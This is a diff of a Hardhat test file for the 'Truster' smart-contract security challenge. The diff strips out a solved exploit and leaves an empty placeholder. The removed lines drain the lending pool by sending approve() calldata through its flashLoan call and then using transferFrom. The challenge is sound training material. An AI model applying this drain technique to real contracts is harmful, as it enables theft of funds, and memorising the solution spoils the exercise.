@@ -1,59 +1,40 @@
-const {ethers, network} = require('hardhat');
-const {expect} = require('chai');
+const { ethers } = require('hardhat');
+const { expect } = require('chai');
 
 describe('[Challenge] Truster', function () {
-    let deployer, attacker;
+    let deployer, player;
+    let token, pool;
 
-    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
+    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [deployer, attacker] = await ethers.getSigners();
+        [deployer, player] = await ethers.getSigners();
 
-        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
-        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);
+        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
+        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
+        expect(await pool.token()).to.eq(token.address);
 
-        this.token = await DamnValuableToken.deploy();
-        this.pool = await TrusterLenderPool.deploy(this.token.address);
+        await token.transfer(pool.address, TOKENS_IN_POOL);
+        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);
 
-        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
-
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.equal(TOKENS_IN_POOL);
-
-        expect(
-            await this.token.balanceOf(attacker.address)
-        ).to.equal('0');
+        expect(await token.balanceOf(player.address)).to.equal(0);
     });
 
-    it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE  */
-        let ABI = [
-            "function approve(address,uint256)"
-        ];
-        let iface = new ethers.utils.Interface(ABI)
-        let calldata = iface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL]);
-
-        await network.provider.send("evm_setAutomine", [false]);
-        await this.pool.connect(attacker).flashLoan(1, this.pool.address, this.token.address, calldata)
-
-        console.log(await this.token.allowance(this.pool.address, attacker.address))
-        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
-        await network.provider.send("evm_mine", []);
-
+    it('Execution', async function () {
+        /** CODE YOUR SOLUTION HERE */
     });
 
     after(async function () {
-        /** SUCCESS CONDITIONS */
+        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
 
-        // Attacker has taken all tokens from the pool
+        // Player has taken all tokens from the pool
         expect(
-            await this.token.balanceOf(attacker.address)
+            await token.balanceOf(player.address)
         ).to.equal(TOKENS_IN_POOL);
         expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.equal('0');
+            await token.balanceOf(pool.address)
+        ).to.equal(0);
     });
 });
 
